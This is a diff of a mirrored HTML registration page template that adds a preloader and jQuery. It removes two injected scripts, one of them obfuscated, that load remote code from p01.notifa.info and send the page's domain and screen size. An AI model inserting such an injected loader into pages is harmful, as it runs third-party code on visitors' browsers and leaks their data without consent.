@@ -1,4 +1,5 @@
-<html lang="en"><!-- Mirrored from demo.riktheme.com/undex-1/side-menu-dark/register.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 02 Oct 2019 08:41:49 GMT --><head>
+<html lang="en"><!-- Mirrored from demo.riktheme.com/undex-1/side-menu-dark/register.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 02 Oct 2019 08:41:49 GMT -->
+<head>
     <meta charset="UTF-8">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -14,11 +15,34 @@
     <!-- Master Stylesheet [If you remove this CSS file, your file will be broken undoubtedly.] -->
     <link rel="stylesheet" href="{{ asset('style.css')}}">
 
-<script type="text/javascript" async="" src="http://p01.notifa.info/3fsmd3/request?id=1&amp;enc=9UwkxLgY9&amp;params=4TtHaUQnUEiP6K%2fc5C582Am8lISurprAp5MWgzit1Y9yKP9YrDwgyOgj9%2b1kTShhDp4kfPwoX5dINCzCbczefiR4q6X0LWx6nRe0DxUs4GyM5TmoEpDrZr%2bCpFOIKK1F%2fvr1eIu%2f633dhqk3X%2b%2fPaWWLlllZS9vu45IQ%2bRyE8kCwE5sSRkqQjNIWkfqPdRs%2fOi%2fpA8oDW76QVEg3OGLUPw0bmykMN7gpj99V0q3mLyz9Y6WNMHCGqz4OkqdqtRemL63VQuxIGwWvWJHs8bqBGoGM7%2fBsPHSF0fW4SR2I783XVC8Xh4LE%2b4eFh5hvzfDO2%2foTRBa8YstDkY3FW4SovUd2tOEMFJx5YaqsgM%2bfoP1iBLtanWbBa4N1W1IkAYwzKYoxQmgI%2b8tDjucXydRGFe4ISgBAXkScJX99yZDvaNYGIP4NFcGRXyjRbe%2b0KeEna2eELtKFOJIPjXNtfLhKLJJKCW%2fg4WxwrTa3K3YfZUqs81gySOiD0qZOdcsFLLO%2bx4eueteWbNfHmYpSjbmGsc7teoPoGVk8&amp;idc_r=35114405284&amp;domain=localhost&amp;sw=1366&amp;sh=768"></script></head>
+    <style type="text/css">
+        .preloader {
+          position: fixed;
+          top: 0;
+          left: 0;
+          width: 100%;
+          height: 100%;
+          z-index: 9999;
+          background-color: #fff;
+        }
+        .preloader .loading {
+          position: absolute;
+          left: 50%;
+          top: 50%;
+          transform: translate(-50%,-50%);
+          font: 14px arial;
+        }
+        </style>
+</head>
 
 <body class="dark-color-overlay bg-img" style="background-image: url(img/bg-img/8.jpg);">
     <!-- Preloader -->
-    
+        <div class="preloader">
+      <div class="loading">
+        <img src="{{ asset('image/love.gif')}}" width="200">
+        <p>Harap Tunggu</p>
+      </div>
+    </div>
 
     <!-- ======================================
     ******* Main Wrapper Area Start **********
@@ -125,7 +149,13 @@
     <!-- Active JS -->
     <script src="{{ asset('js/default-assets/active.js') }}"></script>
 
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAp5MWgzit1Y9yKP9YrDwgyOgj9%2b1kTShhDp4kfPwoX5dINCzCbczefiR4q6X0LWx6nRe0DxUs4GyM5TmoEpDrZr%2bCpFOIKK1F%2fvr1eIu%2f633dhqk3X%2b%2fPaWWLlllZS9vu45IQ%2bRyE8kCwE5sSRkqQjNIWkfqPdRs%2fOi%2fpA8oDW76QVEg3OGLUPw0bmykMN7gpj99V0q3mLyz9Y6WNMHCGqz4OkqdqtRemL63VQuxIGwWvWJHs8bqBGoGM7%2fBsPHSF0fW4SR2I783XVC8Xh4LE%2b4eFh5hvzfDO2%2foTRBa8YstDkY3FW4SovUd2tOEMFJx5YaqsgM%2bfoP1iBLtanWbBa4N1W1IkAYwzKYoxQmgI%2b8tDjucXydRGFe4ISgBAXkScJX99yZDvaNYGIP4NFcGRXyjRbe%2b0KeEna2eELtKFOJIPjXNtfLhKLJJKCW%2fg4WxwrTa3K3YfZUqs81gySOiD0qZOdcsFLLO%2bx4eueteWbNfHmYpSjbmGsc7teoPoGVk8" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+    <script src="http://code.jquery.com/jquery-2.2.1.min.js"></script>
+
+    <script>
+        $(document).ready(function(){
+          $(".preloader").fadeOut();
+        })
+    </script>
 
 
 <!-- Mirrored from demo.riktheme.com/undex-1/side-menu-dark/register.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 02 Oct 2019 08:41:49 GMT -->
